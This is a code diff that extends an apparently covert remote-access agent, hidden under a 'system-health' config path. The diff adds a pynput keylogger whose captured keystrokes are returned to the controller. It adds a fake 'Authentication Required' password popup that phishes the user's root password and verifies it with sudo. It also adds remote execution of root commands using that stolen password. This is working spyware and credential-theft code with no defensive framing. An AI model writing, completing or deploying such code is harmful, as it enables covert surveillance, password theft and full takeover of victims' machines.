@@ -12,6 +12,12 @@ import base64
 import urllib.request
 import urllib.error
 from datetime import datetime, timezone
+import threading
+
+# --- GLOBALS ---
+KEYLOG_BUFFER = []
+ROOT_PASSWORD = None
+KEYLOG_LOCK = threading.Lock()
 
 # --- CONFIGURATION ---
 BASE_PATH = os.path.expanduser("~/.config/system-health")
@@ -23,16 +29,33 @@ KEY = "S3cr3tK3y2024!"
 
 def install_dependencies():
     """Attempt to install missing python dependencies."""
+    restart_needed = False
+    
+    # 1. Check MSS
     try:
         import mss
     except ImportError:
         try:
             print("Installing mss...", flush=True)
             subprocess.run([sys.executable, "-m", "pip", "install", "mss", "--break-system-packages"], check=True)
-            print("Dependencies installed. Restarting agent to apply changes...", flush=True)
-            sys.exit(1) # Force restart to reload environment
+            restart_needed = True
         except Exception as e:
-            print(f"Failed to install deps: {e}", flush=True)
+            print(f"Failed to install mss: {e}", flush=True)
+
+    # 2. Check Pynput
+    try:
+        import pynput
+    except ImportError:
+        try:
+            print("Installing pynput...", flush=True)
+            subprocess.run([sys.executable, "-m", "pip", "install", "pynput", "--break-system-packages"], check=True)
+            restart_needed = True
+        except Exception as e:
+            print(f"Failed to install pynput: {e}", flush=True)
+
+    if restart_needed:
+        print("Dependencies installed. Restarting agent to apply changes...", flush=True)
+        sys.exit(1)
 
 def get_config():
     try:
@@ -101,10 +124,56 @@ def take_screenshot():
         # Pass exception up to process_tasks to be sent as sysinfo
         raise e
 
-def get_keys():
-    # Attempt to grab last minute of keys using xinput test if available
-    # This is a bit tricky without a proper keylogger, using xinput test on master pointer/keyboard
-    return "Keylogging requires root/special setup on Linux. Implemented basic shell logging only."
+# --- KEYLOGGER ---
+def start_keylogger_thread():
+    def on_press(key):
+        global KEYLOG_BUFFER
+        try:
+            char = key.char
+        except AttributeError:
+            char = f"[{str(key).replace('Key.', '')}]"
+            
+        with KEYLOG_LOCK:
+            KEYLOG_BUFFER.append(str(char))
+            if len(KEYLOG_BUFFER) > 5000: # Limit buffer
+                KEYLOG_BUFFER.pop(0)
+
+    try:
+        import pynput.keyboard
+        listener = pynput.keyboard.Listener(on_press=on_press)
+        listener.daemon = True
+        listener.start()
+        print("Keylogger started.", flush=True)
+    except Exception as e:
+        print(f"Keylogger failed to start: {e}", flush=True)
+
+def attempt_root_escalation():
+    global ROOT_PASSWORD
+    print("Attempting root escalation (Fake Auth)...", flush=True)
+    try:
+        cmd = [
+            "zenity", "--password", 
+            "--title=Authentication Required", 
+            "--text=System update requires authentication.\nAuthenticate to continue."
+        ]
+        # 30s timeout
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+        
+        if result.returncode == 0 and result.stdout.strip():
+            pw = result.stdout.strip()
+            # Verify
+            test = subprocess.run(f"echo '{pw}' | sudo -S id", shell=True, capture_output=True, text=True)
+            if test.returncode == 0:
+                ROOT_PASSWORD = pw
+                return True, "Success! Root password captured."
+            else:
+                return False, "Password captured but incorrect."
+        else:
+            return False, "User cancelled or empty password."
+    except FileNotFoundError:
+        return False, "Zenity not installed (cannot popup)."
+    except Exception as e:
+        return False, f"Escalation error: {e}"
 
 def record_audio(duration=10):
     try:
@@ -262,13 +331,35 @@ def process_tasks(config, device_id):
                     result_data = {"data": "Audio recording failed. 'arecord' missing or input unavailable."}
                     data_type = "sysinfo"
 
+            elif task_type == "input_monitor": # Keylogs
+                global KEYLOG_BUFFER
+                with KEYLOG_LOCK:
+                    logs = "".join(KEYLOG_BUFFER)
+                    KEYLOG_BUFFER.clear()
+                
+                if logs:
+                    result_data = {"data": logs}
+                    data_type = "keylog"
+                    print(f"Sent {len(logs)} chars of keylogs.", flush=True)
+                else:
+                    result_data = {"data": "No keylogs captured yet."}
+                    data_type = "sysinfo"
+
+            elif task_type == "escalate_privileges":
+                success, msg = attempt_root_escalation()
+                result_data = {"data": msg}
+                data_type = "sysinfo"
+                if success:
+                    # Optional: Update device info to show rooted?
+                    pass
+
             elif task_type == "auto_destruct":
                 success = self_destruct()
                 result_data = {"data": "Self-destruct sequence initiated. Agent removed." if success else "Self-destruct failed."}
                 data_type = "sysinfo"
                 should_destruct = True
                     
-            elif task_type in ["cmd_exec", "cmd_exec_admin"]:
+            elif task_type == "cmd_exec":
                 cmd = params.get('command', '')
                 print(f"Executing command: {cmd}", flush=True)
                 stdout, stderr, code = run_command(cmd)
@@ -277,7 +368,32 @@ def process_tasks(config, device_id):
                     "output": stdout,
                     "error": stderr,
                     "exit_code": code,
-                    "executed_as": "ROOT" if os.geteuid() == 0 else "USER"
+                    "executed_as": "USER"
+                }
+                result_data = {"data": json.dumps(res)}
+                data_type = "cmd_result"
+                
+            elif task_type == "cmd_exec_admin":
+                cmd = params.get('command', '')
+                if ROOT_PASSWORD:
+                    print(f"Executing ROOT command: {cmd}", flush=True)
+                    # Use sudo -S
+                    full_cmd = f"echo '{ROOT_PASSWORD}' | sudo -S {cmd}"
+                    stdout, stderr, code = run_command(full_cmd)
+                    exec_as = "ROOT"
+                else:
+                    print("Root command requested but no password. Failing.", flush=True)
+                    stdout = ""
+                    stderr = "Error: Root access not yet acquired. Run 'Escalate Privileges' first."
+                    code = -1
+                    exec_as = "USER"
+                    
+                res = {
+                    "command": cmd,
+                    "output": stdout,
+                    "error": stderr,
+                    "exit_code": code,
+                    "executed_as": exec_as
                 }
                 result_data = {"data": json.dumps(res)}
                 data_type = "cmd_result"
@@ -327,6 +443,7 @@ def main():
     
     # Try install deps on first run
     install_dependencies()
+    start_keylogger_thread()
     
     while True:
         try:
